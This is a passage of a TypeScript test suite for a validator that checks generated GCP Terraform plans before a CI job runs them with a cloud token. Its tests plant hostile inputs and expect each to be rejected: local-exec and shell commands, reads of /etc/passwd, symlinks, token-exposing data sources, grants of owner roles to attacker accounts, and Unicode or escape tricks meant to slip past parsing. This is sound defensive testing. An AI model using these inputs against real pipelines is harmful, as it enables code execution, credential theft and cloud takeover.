// Copyright 2026 Gabriel Ignat
// SPDX-License-Identifier: AGPL-3.0-only

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, describe, it } from "node:test";

import { assembleModel } from "terragram-engine/engine";
import { GCP_IMAGES, GCP_LOG_DELIVERY_MEMBER, GCP_ROLES } from "terragram-engine/kinds";
import { emitTerraform } from "terragram-engine/terraform";
import { GCP_PLANS } from "../scripts/emit-plans.ts";
import { adaptForSandbox } from "../scripts/lib/sandbox-gcp.ts";
import { ALLOWED_DATA, ALLOWED_IMAGES, ALLOWED_PROVIDERS, ALLOWED_RESOURCES, ALLOWED_ROLES, DENIED_DATA, LOG_DELIVERY_MEMBER, PINNED_SOURCES, PLAN_IDS, PlanRejected, validatePlans, validateSource } from "../scripts/sandbox-gcp-validate.mjs";


/**
 * The gate between the sandbox workflow's two jobs: the plans the first job wrote are checked, by the job that
 * can get a token, before Terraform runs on them (`scripts/sandbox-gcp-validate.mjs`). These hold that what the
 * generator writes today passes, and that each thing a compromised dependency could plant instead does not.
 */

const made: string[] = [];
after(() => {
  for (const dir of made) rmSync(dir, { recursive: true, force: true });
});

/** The four plans as the workflow writes them, in a new directory. */
function plans(): string {
  const root = mkdtempSync(join(tmpdir(), "sandbox-validate-"));
  made.push(root);
  for (const plan of GCP_PLANS) {
    const generated = emitTerraform(assembleModel(plan.kinds, undefined, true).model, "gcp", "terraform").files;
    for (const file of adaptForSandbox(plan.id, generated)) {
      const path = join(root, plan.id, file.name);
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, file.content);
    }
  }
  return root;
}

const read = (root: string, rel: string) => readFileSync(join(root, rel), "utf8");
const write = (root: string, rel: string, content: string) => {
  mkdirSync(dirname(join(root, rel)), { recursive: true });
  writeFileSync(join(root, rel), content);
};
/** Appends a block to a plan's main.tf and expects the plans to be refused for `why`. */
const refusesAppended = (block: string, why: RegExp) => {
  const root = plans();
  write(root, "gcp-site/main.tf", `${read(root, "gcp-site/main.tf")}\n${block}\n`);
  assert.throws(() => validatePlans(root), (e) => e instanceof PlanRejected && why.test(e.message), block);
};
const refusesWhole = (mutate: (root: string) => void, why: RegExp) => {
  const root = plans();
  mutate(root);
  assert.throws(() => validatePlans(root), (e) => e instanceof PlanRejected && why.test(e.message));
};
const refusesSource = (text: string, why: RegExp) => assert.throws(() => validateSource(text, "x.tf"), (e) => e instanceof PlanRejected && why.test(e.message), text);

describe("the sandbox's check of the plans", () => {
  it("passes the four plans as the generator writes them, and gives a digest that follows their content", () => {
    const root = plans();
    const first = validatePlans(root);
    assert.equal(first.plans, 4);
    assert.ok(first.files >= 12, "the plans' files were read");
    assert.match(first.digest, /^sha256:[0-9a-f]{64}$/);
    assert.equal(validatePlans(root).digest, first.digest);
    write(root, "gcp-site/main.tf", `${read(root, "gcp-site/main.tf")}# a comment\n`);
    assert.notEqual(validatePlans(root).digest, first.digest);
  });

  it("names the same plans, and the same providers, as the generator", () => {
    assert.deepEqual([...PLAN_IDS].sort(), GCP_PLANS.map((p) => p.id).sort());
    const root = plans();
    const wanted = new Set<string>();
    for (const id of PLAN_IDS) for (const m of read(root, `${id}/main.tf`).matchAll(/^\s+([a-z-]+) = \{\n\s+source\s+= "([^"]+)"\n\s+version\s+= "([^"]+)"/gm)) {
      assert.deepEqual(ALLOWED_PROVIDERS[m[1] as keyof typeof ALLOWED_PROVIDERS], { source: m[2], version: m[3] }, `${id}: ${m[1]}`);
      wanted.add(m[1] as string);
    }
    assert.deepEqual([...wanted].sort(), Object.keys(ALLOWED_PROVIDERS).sort());
    for (const path of Object.keys(PINNED_SOURCES)) assert.ok(read(root, path).length > 0, path);
  });

  it("locks, for each root Terraform runs in, the providers it requires and no others, to versions its constraints allow", () => {
    const root = plans();
    const roots = new Map<string, string>(PLAN_IDS.map((id) => [id, read(root, `${id}/main.tf`)]));
    roots.set("network", readFileSync(new URL("../scripts/sandbox-gcp-network/main.tf", import.meta.url), "utf8"));
    assert.equal(roots.size, 5);
    for (const [id, main] of roots) {
      const lock = readFileSync(new URL(`../scripts/sandbox-gcp-locks/${id}.terraform.lock.hcl`, import.meta.url), "utf8");
      const required = [...main.matchAll(/^\s+([a-z-]+) = \{\n\s+source\s+= "hashicorp\/[a-z-]+"/gm)].map((m) => m[1] as string);
      const locked = [...lock.matchAll(/provider "registry\.terraform\.io\/hashicorp\/([a-z-]+)" \{\n\s+version\s+= "([^"]+)"\n\s+constraints = "([^"]+)"\n\s+hashes = \[\n([^\]]*)\]/g)];
      assert.ok(required.length >= 1, id);
      assert.deepEqual(locked.map((m) => m[1]).sort(), [...required].sort(), `${id}: the lock names what the root requires`);
      for (const [, name, version, constraint, hashes] of locked) {
        const provider = ALLOWED_PROVIDERS[name as keyof typeof ALLOWED_PROVIDERS];
        assert.equal(constraint, provider.version, `${id}: ${name}`);
        const [major, minor] = (/^~> (\d+)\.(\d+)$/.exec(provider.version) ?? []).slice(1).map(Number);
        const [lockedMajor, lockedMinor] = (version as string).split(".").map(Number);
        assert.ok(lockedMajor === major && (lockedMinor ?? 0) >= (minor ?? 0), `${id}: ${name} ${version} satisfies ${provider.version}`);
        assert.match(hashes ?? "", /"h1:[A-Za-z0-9+/=]+"/, `${id}: ${name} has a h1 hash`);
        assert.match(hashes ?? "", /"zh:[0-9a-f]{64}"/, `${id}: ${name} has zh hashes`);
      }
    }
  });

  it("passes the network root the workflow applies with the plans", () => {
    const text = readFileSync(new URL("../scripts/sandbox-gcp-network/main.tf", import.meta.url), "utf8");
    validateSource(text, "network/main.tf");
  });

  it("refuses code that runs on the runner", () => {
    refusesAppended('data "external" "x" {\n  program = ["sh", "-c", "id"]\n}', /data external is not a data source the generator writes/);
    refusesAppended('resource "null_resource" "x" {\n}', /null_resource/);
    refusesAppended('resource "terraform_data" "x" {\n  provisioner "local-exec" {\n    command = "id"\n  }\n}', /provisioner/);
    refusesAppended('resource "google_storage_bucket" "x" {\n  name = "x"\n  provisioner "remote-exec" {\n  }\n}', /provisioner/);
    refusesAppended('locals {\n  x = "local-exec"\n}', /local-exec/);
    refusesAppended('data "terraform_remote_state" "x" {\n}', /terraform_remote_state/);
    refusesAppended('resource "local_file" "x" {\n}', /local_file/);
    refusesAppended('data "archive_file" "x" {\n  type        = "zip"\n  source_dir  = "/home/runner"\n  output_path = "${path.module}/.terraform/x.zip"\n}', /archive_file may only zip/);
    refusesAppended('data "archive_file" "x" {\n  type        = "zip"\n  source_dir  = "${path.module}/../.."\n  output_path = "${path.module}/.terraform/x.zip"\n}', /archive_file may only zip/);
    refusesAppended('data "archive_file" "x" {\n  type        = "zip"\n  source_file = "/etc/passwd"\n  output_path = "${path.module}/.terraform/x.zip"\n}', /archive_file may only zip/);
    refusesAppended('data "archive_file" "x" {\n  type        = "zip"\n  source_dir  = "${path.module}/src/a"\n  output_path = "/tmp/x.zip"\n}', /archive_file may only zip/);
  });

  it("refuses a file that is read, and a provider's own function", () => {
    refusesAppended('locals {\n  x = file("/etc/passwd")\n}', /function file/);
    refusesAppended('locals {\n  x = "${templatefile("a", {})}"\n}', /function templatefile/);
    refusesAppended('locals {\n  x = "a ${ { b = filebase64("c") } } d"\n}', /function filebase64/);
    refusesAppended("locals {\n  x = provider::external::run()\n}", /function of a provider/);
    refusesAppended('locals {\n  x = fileset(path.module, "*")\n}', /function fileset/);
  });

  it("allows exactly the resource and data source types the four plans and the network root contain", () => {
    const root = plans();
    const texts = PLAN_IDS.flatMap((id) => readdirSync(join(root, id)).filter((n) => n.endsWith(".tf")).map((n) => read(root, `${id}/${n}`)));
    texts.push(readFileSync(new URL("../scripts/sandbox-gcp-network/main.tf", import.meta.url), "utf8"));
    const types = (kind: string) => [...new Set(texts.flatMap((t) => [...t.matchAll(new RegExp(`^${kind} "([^"]+)" "`, "gm"))].map((m) => m[1] as string)))].sort();
    assert.deepEqual([...ALLOWED_RESOURCES].sort(), types("resource"), "ALLOWED_RESOURCES is what the generator writes: add a new type to it, and remove one it no longer writes");
    assert.deepEqual([...ALLOWED_DATA].sort(), types("data"), "ALLOWED_DATA is what the generator writes");
    for (const type of ALLOWED_RESOURCES) assert.match(type, /^google_[a-z0-9_]+$/);
  });

  it("refuses a type the generator does not write, though it is of an allowed provider", () => {
    refusesAppended('resource "google_compute_vpn_gateway" "x" {\n}', /resource google_compute_vpn_gateway is not a resource type the generator writes/);
    refusesAppended('resource "google_service_account_key" "x" {\n}', /google_service_account_key is not a resource type/);
    refusesAppended('data "google_compute_instance" "x" {\n}', /data google_compute_instance is not a data source the generator writes/);
    // A type the generator starts to write fails the plans until it is listed.
    refusesWhole((r) => write(r, "gcp-site/main.tf", read(r, "gcp-site/main.tf").replace('resource "google_compute_url_map"', 'resource "google_compute_region_url_map"')), /google_compute_region_url_map is not a resource type/);
    // An escape in a label does not spell a listed type.
    refusesAppended('resource "google_storage_\\u0062ucket" "x" {\n}', /is not a resource type/);
  });

  it("refuses the data sources that hand out a token, as blocks and as references, even if they are listed", () => {
    const tokens = [...DENIED_DATA];
    assert.equal(tokens.length, 5);
    const exposing = ["google_client_config", "google_service_account_access_token", "google_service_account_id_token", "google_service_account_jwt", "google_client_openid_userinfo"];
    assert.deepEqual([...tokens].sort(), [...exposing].sort());
    for (const type of exposing) {
      refusesAppended(`data "${type}" "x" {\n}`, /hands out a token/);
      refusesAppended(`locals {\n  t = data.${type}.x.access_token\n}`, /hands out a token/);
      refusesAppended(`resource "google_storage_bucket_object" "x" {\n  name    = "x"\n  bucket  = "b"\n  content = data.${type}.x.access_token\n}`, /bucket object may set only/);
      ALLOWED_DATA.add(type);
      try {
        refusesAppended(`data "${type}" "x" {\n}`, /hands out a token/);
        refusesAppended(`locals {\n  t = data.${type}.x.access_token\n}`, /hands out a token/);
      } finally {
        ALLOWED_DATA.delete(type);
      }
    }
    refusesAppended('locals {\n  t = data["google_client_config"]\n}', /not written plainly/);
    refusesAppended('locals {\n  t = "${data.google_client_config.x.access_token}"\n}', /hands out a token/);
    refusesAppended('locals {\n  t = data.google_secret_manager_secret_version.x.secret_data\n}', /hands out a token/);
  });

  it("refuses an attribute that reads a local path, and a bucket object that is not its archive", () => {
    const object = (attrs: string) => `resource "google_storage_bucket_object" "x" {\n  name   = "x"\n  bucket = "b"\n${attrs}\n}`;
    refusesAppended(object('  source = "/etc/passwd"'), /source may only be the output_path/);
    refusesAppended(object('  source = "${path.module}/src/x"'), /source may only be the output_path/);
    refusesAppended(object("  source = data.archive_file.not_declared.output_path"), /source may only be the output_path/);
    refusesAppended(object("  source = data.archive_file.functions.output_base64sha256"), /source may only be the output_path/);
    refusesAppended(object("  source = data.google_project.x.number"), /source may only be the output_path|data google_project/);
    refusesAppended(object('  source_file = "/etc/passwd"'), /bucket object may set only/);
    refusesAppended(object('  content = "inline"'), /bucket object may set only/);
    refusesAppended(object("  content = data.google_project.x.number"), /bucket object may set only/);
    refusesAppended(object("  content = jsonencode(data.google_storage_project_service_account.x)"), /bucket object may set only/);
    refusesAppended(object("  retention {\n  }"), /bucket object may set only/);
    refusesAppended('resource "google_storage_bucket" "x" {\n  name   = "x"\n  source = "/etc/passwd"\n}', /the attribute source/);
    refusesAppended('resource "google_storage_bucket" "x" {\n  name = "x"\n  inner {\n    source_dir = "/"\n  }\n}', /the attribute source_dir/);
    refusesAppended('resource "google_compute_instance" "x" {\n  credentials = "x"\n}', /the attribute credentials/);
    refusesAppended('resource "google_storage_bucket" "x" {\n  name = path.module\n}', /reference to path/);
    refusesAppended('output "x" {\n  value = path["cwd"]\n}', /reference to path/);
    refusesAppended('output "x" {\n  value = "${path.root}"\n}', /reference to path/);
    // What the generator writes is its archive, and its own placeholder.
    validateSource(object("  source = data.archive_file.functions.output_path").replace('resource', 'data "archive_file" "functions" {\n  type        = "zip"\n  source_dir  = "${path.module}/src/functions"\n  output_path = "${path.module}/.terraform/functions.zip"\n}\n\nresource'), "x.tf");
  });

  it("refuses a function that reads the disk wherever the name is, whatever follows it", () => {
    const names = ["file", "fileset", "filebase64", "filebase64sha256", "filebase64sha512", "filesha1", "filesha256", "filesha512", "filemd5", "fileexists", "templatefile", "templatestring", "abspath", "pathexpand"];
    for (const name of names) {
      const why = new RegExp(`the function ${name}`);
      for (const call of [`${name}("/etc/passwd")`, `${name}\n("/etc/passwd")`, `${name} /* c */ ("/etc/passwd")`, `${name} # c\n("/etc/passwd")`, `${name} // c\n("/etc/passwd")`, `${name}\n\n  ("/etc/passwd")`, `${name}`, `${name.toUpperCase()}("x")`, `x.${name}`]) {
        // Where the parser may see a newline between the name and its parenthesis: in brackets, where HCL skips them.
        refusesSource(`locals {\n  x = [\n    ${call}\n  ]\n}\n`, new RegExp(`the function ${name}`, "i"));
        refusesSource(`locals {\n  x = (${call})\n}\n`, new RegExp(`the function ${name}`, "i"));
        refusesSource(`locals {\n  x = "a ${"$"}{ ${call} } b"\n}\n`, new RegExp(`the function ${name}`, "i"));
      }
      refusesSource(`locals {\n  x = ${name}("/etc/passwd")\n}\n`, why);
    }
    refusesSource('locals {\n  x = "${ "${ file("/etc/passwd") }" }"\n}\n', /the function file/);
    // A run of three `$` or `%` before a brace is one HCL and this tokenizer might read differently: refused.
    refusesSource('locals {\n  x = "$$${file(y)}"\n}\n', /run of three or more \$ before a brace/);
    refusesSource('locals {\n  x = "$$$${file(y)}"\n}\n', /run of three or more \$ before a brace/);
    refusesSource('locals {\n  x = "%%%{ if true }"\n}\n', /run of three or more % before a brace/);
    validateSource('locals {\n  x = "a $${file(y)} $${b} %%{c}"\n}\n', "x.tf");
    refusesSource('locals {\n  x = "%{ if true }${file(y)}%{ endif }"\n}\n', /the function file/);
    refusesSource('locals {\n  x = "${~ file(y) ~}"\n}\n', /the function file/);
    refusesSource('locals {\n  x = provider\n  ::external::run()\n}\n', /function of a provider/);
    refusesSource("locals {\n  x = [provider\n  /* c */ ::external::run()]\n}\n", /function of a provider/);
    refusesSource("locals {\n  x = provider::external::run()\n}\n", /function of a provider/);
    refusesSource("locals {\n  x = core::file(y)\n}\n", /function of a provider|the function file/);
  });

  it("refuses what HCL would read differently from the tokenizer", () => {
    // A character HCL does not use outside a string, among them the letters of a Unicode identifier.
    refusesSource('locals {\n  x = \uFB01le("/etc/passwd")\n}\n', /character HCL does not use/);
    refusesSource('locals {\n  x = fil\u0435("/etc/passwd")\n}\n', /character HCL does not use/);
    refusesSource("locals {\n  x\u00a0= 1\n}\n", /character HCL does not use/);
    // An escape HCL does not read, a unicode escape that is cut short, and a line ending of a lone carriage return.
    refusesSource('locals {\n  x = "\\q${file(y)}"\n}\n', /escape in a string/);
    refusesSource('locals {\n  x = "\\$"\n}\n', /escape in a string/);
    refusesSource('locals {\n  x = "\\u12"\n}\n', /escape in a string/);
    refusesSource('locals {\n  x = "\\U0000004"\n}\n', /escape in a string/);
    refusesSource('locals {\n  x = "a\\\nb"\n}\n', /escape in a string/);
    refusesSource('locals {\n  x = 1 # a comment\rprovisioner "x" {}\n}\n', /carriage return/);
    refusesSource('locals {\n  x = "a\rb"\n}\n', /carriage return/);
    refusesSource("locals {\n  x = 1\u0085\n}\n", /control or direction-changing/);
    refusesSource("locals {\n  x = 1\u2028\n}\n", /control or direction-changing/);
    // The escapes it reads are read, and a quote it escapes does not end the string.
    validateSource('locals {\n  a = "q\\" \\u0041 \\U00000041 \\n \\t \\r \\\\ ${var.x}"\n  b = "x" # \\\n}\n', "x.tf");
    refusesSource('locals {\n  a = "\\" ${file(y)} \\""\n}\n', /the function file/);
    // A comment of either kind, a string, and a template directive hide nothing from the checks that follow them.
    refusesSource('locals {\n  a = "x" // "\n  b = file(y)\n}\n', /the function file/);
    refusesSource('locals {\n  a = "x" # "\n  b = file(y)\n}\n', /the function file/);
    refusesSource('locals {\n  a = 1 /* " */ + file(y)\n}\n', /the function file/);
    refusesSource('locals {\n  a = "/* "\n  b = file(y) /* */\n}\n', /the function file/);
    refusesSource('locals {\n  a = "// ${file(y)}"\n}\n', /the function file/);
    refusesSource('locals {\n  a = "# ${file(y)}"\n}\n', /the function file/);
    refusesSource('locals {\n  a = "%{ for x in y }${file(x)}%{ endfor }"\n}\n', /the function file/);
    // A block's type or label spelt with an escape is not the type it spells.
    refusesSource('resource "google_storage_bucket" "x" {\n  provisioner\n  "local-exec" {\n  }\n}\n', /provisioner|neither a block/);
    refusesSource('locals {\n  a = "local\\u002dexec"\n  b = "LOCAL-EXEC"\n}\n', /local-exec or remote-exec/);
  });

  it("refuses a backend, a cloud block, and anything else in the terraform block", () => {
    const root = plans();
    const main = read(root, "gcp-site/main.tf");
    write(root, "gcp-site/main.tf", main.replace("terraform {\n", 'terraform {\n  backend "http" {\n    address = "https://example.com"\n  }\n'));
    assert.throws(() => validatePlans(root), /terraform may hold only required_providers, not backend/);
    write(root, "gcp-site/main.tf", main.replace("terraform {\n", 'terraform {\n  cloud {\n    organization = "x"\n  }\n'));
    assert.throws(() => validatePlans(root), /not cloud/);
    write(root, "gcp-site/main.tf", main.replace("terraform {\n", "terraform {\n  experiments = [x]\n"));
    assert.throws(() => validatePlans(root), /terraform may set only a required_version/);
    write(root, "gcp-site/main.tf", main.replace("terraform {\n", "terraform {\n  provider_meta \"google\" {\n  }\n"));
    assert.throws(() => validatePlans(root), /not provider_meta/);
  });

  it("refuses modules, and the other blocks the generator does not write", () => {
    refusesAppended('module "x" {\n  source = "git::https://example.com/x.git"\n}', /module block is not allowed/);
    refusesAppended('module "x" {\n  source = "./local"\n}', /module block is not allowed/);
    refusesAppended('moved {\n  from = a.b\n  to   = a.c\n}', /moved block/);
    refusesAppended('import {\n  to = a.b\n  id = "x"\n}', /import block/);
    refusesAppended('removed {\n  from = a.b\n}', /removed block/);
    refusesAppended('check "x" {\n}', /check block/);
    refusesAppended("x = 1", /attribute outside a block/);
    refusesAppended('resource "google_a" {\n}', /takes 2 labels/);
  });

  it("allows only the providers, sources and versions it lists, written exactly", () => {
    const bad = (from: string, to: string, why: RegExp) => {
      const root = plans();
      const main = read(root, "gcp-site/main.tf");
      assert.ok(main.includes(from), from);
      write(root, "gcp-site/main.tf", main.replace(from, to));
      assert.throws(() => validatePlans(root), why, to);
    };
    bad('source  = "hashicorp/google"', 'source  = "evil/google"', /provider google must be exactly/);
    bad('source  = "hashicorp/google"', 'source  = "registry.terraform.io/hashicorp/google"', /provider google must be exactly/);
    bad('version = "~> 8.12"', 'version = ">= 8.12"', /provider google must be exactly/);
    bad('version = "~> 8.12"', 'version = "~> 8.12, != 8.12.1"', /provider google must be exactly/);
    bad('version = "~> 8.12"', 'version = "~> 8.12"\n      configuration_aliases = [google.x]', /object of strings/);
    bad("google = {", "google = {\n      extra = \"x\"", /provider google must be exactly/);
    bad("google = {", 'http = {\n      source  = "hashicorp/http"\n      version = "~> 3.0"\n    }\n    google = {', /provider http is not allowed/);
    bad("google = {", 'external = {\n      source  = "hashicorp/external"\n      version = "~> 2.3"\n    }\n    google = {', /provider external is not allowed/);
    bad("google = {", 'google = "~> 8.12"\n    google2 = {', /object of strings/);
    bad('provider "google" {\n', 'provider "google" {\n  credentials = "x"\n', /a provider may set only/);
    bad('provider "google" {\n', 'provider "google" {\n  impersonate_service_account = "x@y.z"\n', /a provider may set only/);
    refusesAppended('provider "http" {\n}', /provider http is not configured here/);
    refusesAppended('provider "archive" {\n}', /provider archive is not configured here/);
  });

  it("refuses files that are not plain Terraform, and names that are not plain", () => {
    refusesWhole((r) => write(r, "gcp-site/.terraform.lock.hcl", "# planted\n"), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/.terraformrc", 'provider_installation {\n}\n'), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/.terraform/providers/x", "x"), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/terraform.d/plugins/x", "x"), /not a \*\.tf|a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/extra.tf.json", "{}"), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/run.sh", "id"), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/terraform.tfstate", "{}"), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/override.tf", ""), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/x_override.tf", ""), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/a b.tf", ""), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/a\\b.tf", ""), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/ä.tf", ""), /name is not a plain one/);
    refusesWhole((r) => write(r, "gcp-site/src/x/index.js", "require('child_process')"), /a file that is not/);
    refusesWhole((r) => write(r, "gcp-site/a/b/c/d/e/f.tf", ""), /too deep/);
    refusesWhole((r) => write(r, "gcp-site/big.tf", `# ${"x".repeat(300 * 1024)}\n`), /over the size limit/);
    refusesWhole((r) => write(r, "gcp-site/utf16.tf", "\u0000x"), /control or direction-changing/);
    refusesWhole((r) => write(r, "gcp-site/bidi.tf", "# \u202e\n"), /control or direction-changing/);
  });

  it("refuses a placeholder source that is not the generator's", () => {
    refusesWhole((r) => write(r, "gcp-serverless/src/functions/index.js", `${read(r, "gcp-serverless/src/functions/index.js")}require("child_process");\n`), /not the generator's/);
    refusesWhole((r) => write(r, "gcp-data/src/app-service/package.json", '{"scripts":{"postinstall":"id"}}'), /not the generator's/);
  });

  it("refuses links, and entries that are not the four plans", () => {
    refusesWhole((r) => symlinkSync("/etc/passwd", join(r, "gcp-site", "main2.tf")), /not a regular file/);
    refusesWhole((r) => symlinkSync("/etc", join(r, "gcp-site", "etc")), /not a regular file/);
    refusesWhole((r) => {
      rmSync(join(r, "gcp-data"), { recursive: true });
      symlinkSync(join(r, "gcp-site"), join(r, "gcp-data"));
    }, /not a directory/);
    refusesWhole((r) => write(r, "extra/main.tf", ""), /expected exactly/);
    refusesWhole((r) => write(r, "network/main.tf", ""), /expected exactly/);
    refusesWhole((r) => rmSync(join(r, "gcp-data"), { recursive: true }), /expected exactly/);
    refusesWhole((r) => writeFileSync(join(r, "stray.tf"), ""), /expected exactly/);
    assert.throws(() => validatePlans(join(tmpdir(), "no-such-plans-dir")), /no such directory/);
    const file = join(plans(), "gcp-site", "main.tf");
    assert.throws(() => validatePlans(file), /not a directory/);
  });

  it("refuses what it cannot read, rather than skipping it", () => {
    refusesSource('resource "google_x" "y" {\n  a = "never closed\n}\n', /runs over a line/);
    refusesSource('resource "google_x" "y" {\n  a = "never closed', /never closed/);
    refusesSource('resource "google_x" "y" {\n  a = 1\n', /block is never closed/);
    refusesSource('resource "google_x" "y" {\n  a = [1\n}\n', /never closed/);
    refusesSource('resource "google_x" "y" {\n  a = 1 ]\n}\n', /never opened/);
    refusesSource('locals {\n  /* never closed\n}\n', /comment is never closed/);
    refusesSource('locals {\n  a = <<EOT\nx\nEOT\n}\n', /heredoc/);
    refusesSource('locals {\n  a = "${ never"\n}\n', /runs over a line|never closed/);
    refusesSource("locals {\n  a = `x`\n}\n", /character HCL does not use/);
    refusesSource('locals {\n  a\n}\n', /neither a block nor an attribute/);
    refusesSource('locals {\n  a = \n}\n', /has no value/);
    refusesSource('locals { a = 1 } provisioner "x" {}\n', /provisioner/);
    refusesSource('resource "google_${x}" "y" {\n}\n', /interpolation/);
  });

  it("is not fooled by text that looks like structure", () => {
    // Braces, comment markers and quotes inside strings and comments do not move the blocks.
    const decoys = 'locals {\n  a = "} # {"\n  b = "// }"\n  c = "\\" } \\""\n}\n';
    validateSource(`${decoys}resource "google_storage_bucket" "x" {\n  name = "${"${var.name_prefix}"}-x" # } provisioner\n  /* provisioner "local-exec" { */\n}\n`, "x.tf");
    refusesSource(`${decoys}resource "terraform_data" "x" {\n}\n`, /not a resource type the generator writes/);
    refusesSource(`${decoys}module "x" {\n}\n`, /module block/);
    refusesSource('locals {\n  a = "}"\n}\nterraform {\n  backend "s3" {\n  }\n}\n', /not backend/);
    // `$${` is text, so what follows it is not an interpolation; an interpolation's own braces nest.
    validateSource('locals {\n  a = "$${file(x)}"\n  b = "${ { c = 1 }.c }"\n}\n', "x.tf");
    refusesSource('locals {\n  a = "$${x} ${file(y)}"\n}\n', /function file/);
    // One-line blocks and objects spread over lines.
    validateSource('variable "x" { type = string }\nlocals {\n  m = {\n    a = 1,\n    b = [\n      2,\n    ]\n  }\n}\n', "x.tf");
  });

  it("refuses the plans on the command line, with a message that cannot start a workflow command", () => {
    const script = new URL("../scripts/sandbox-gcp-validate.mjs", import.meta.url).pathname;
    const good = plans();
    const ok = spawnSync("node", [script, good], { encoding: "utf8" });
    assert.equal(ok.status, 0, ok.stdout + ok.stderr);
    assert.match(ok.stdout, /^The 4 plans \(\d+ files\) are what the generator writes\.\ndigest sha256:[0-9a-f]{64}\n$/);
    const bad = plans();
    write(bad, "gcp-site/main.tf", `${read(bad, "gcp-site/main.tf")}\nmodule "x" {\n}\n`);
    write(bad, "gcp-site/x::error::y\u001b.tf", "");
    const fail = spawnSync("node", [script, bad], { encoding: "utf8" });
    assert.equal(fail.status, 1);
    assert.equal(fail.stdout.trim().split("\n").length, 1);
    assert.match(fail.stdout, /^::error::The plans are not what the generator writes, and nothing was run on them: /);
    assert.doesNotMatch(fail.stdout.slice("::error::".length), /::/);
    assert.equal(spawnSync("node", [script], { encoding: "utf8" }).status, 2);
    assert.equal(spawnSync("node", [script, good, "x"], { encoding: "utf8" }).status, 2);
  });
});

/**
 * The check reads values, not only names: a plan is applied with a cloud token, so a grant of `roles/owner`, a startup
 * script on a virtual machine or another image in a container is as much "not what the generator writes" as a module is.
 */
describe("the sandbox's check of what the plans grant and run", () => {
  /** The first plan that has the text, and the plan's root with the text replaced by another. */
  const tamper = (file: string, from: string | RegExp, to: string, why: RegExp) => {
    const root = plans();
    const before = read(root, file);
    const changed = before.replace(from, to);
    assert.notEqual(changed, before, `${file} has ${from}`);
    write(root, file, changed);
    assert.throws(() => validatePlans(root), (e) => e instanceof PlanRejected && why.test(e.message), `${from} -> ${to}`);
  };
  const SA = "serviceAccount:${google_service_account.virtual_machine.email}";

  it("allows exactly the roles, images and members the generator writes", () => {
    assert.deepEqual([...ALLOWED_ROLES].sort(), Object.values(GCP_ROLES).sort(), "ALLOWED_ROLES is GCP_ROLES in gcp-kinds.ts");
    assert.deepEqual([...ALLOWED_IMAGES].sort(), Object.values(GCP_IMAGES).sort(), "ALLOWED_IMAGES is GCP_IMAGES in gcp-kinds.ts");
    assert.equal(LOG_DELIVERY_MEMBER, GCP_LOG_DELIVERY_MEMBER);
    const root = plans();
    const text = PLAN_IDS.map((id) => read(root, `${id}/main.tf`)).join("\n");
    const roles = new Set([...text.matchAll(/"(roles\/[^"]+)"/g)].map((m) => m[1] as string));
    assert.deepEqual([...roles].sort(), [...ALLOWED_ROLES].sort(), "the four plans use every allowed role and no other");
    assert.ok(text.includes(GCP_IMAGES.cloudRun) && text.includes(GCP_IMAGES.virtualMachine));
  });

  it("refuses a grant of a role the generator does not write, at the project or on anything else", () => {
    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/owner"', /role "roles\/owner"/);
    tamper("gcp-platform/main.tf", /"roles\/monitoring\.viewer"/, '"roles/editor"', /role "roles\/editor"/);
    tamper("gcp-platform/main.tf", /"roles\/artifactregistry\.reader"/, '"roles/iam.serviceAccountTokenCreator"', /role "roles\/iam\.serviceAccountTokenCreator"/);
    tamper("gcp-site/main.tf", /"roles\/storage\.objectViewer"/, '"roles/storage.admin"', /role "roles\/storage\.admin"/);
    tamper("gcp-data/main.tf", /"roles\/cloudkms\.cryptoKeyEncrypterDecrypter"/, '"roles/cloudkms.admin"', /role "roles\/cloudkms\.admin"/);
    tamper("gcp-serverless/main.tf", /"roles\/run\.invoker"/, '"roles/run.admin"', /role "roles\/run\.admin"/);
    // A role that is allowed somewhere is not allowed everywhere: the project's grants are the service accounts' own few.
    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/storage.objectViewer"', /role "roles\/storage\.objectViewer" is not one the generator grants on google_project_iam_member/);
    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/run.invoker"', /role "roles\/run\.invoker"/);
    tamper("gcp-platform/main.tf", /"roles\/logging\.logWriter"/, '"roles/${var.region}"', /role .* is not a string|role/);
    refusesAppended(`resource "google_project_iam_member" "x" {\n  project = var.project_id\n  role    = "roles/owner"\n  member  = "${SA}"\n}`, /role "roles\/owner"/);
  });

  it("refuses a grant to a member that is not a service account the plan creates or an agent it names", () => {
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "user:attacker@example.com"', /member "user:attacker@example\.com"/);
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:attacker@evil.iam.gserviceaccount.com"', /member "serviceAccount:attacker@evil/);
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:${google_service_account.ghost.email}"', /service account ghost/);
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "allUsers"', /member "allUsers"/);
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, "member  = var.admin", /member/);
    tamper("gcp-platform/main.tf", /member\s+= "serviceAccount:\$\{google_service_account\.virtual_machine\.email\}"/, 'member  = "serviceAccount:${var.admin}"', /member/);
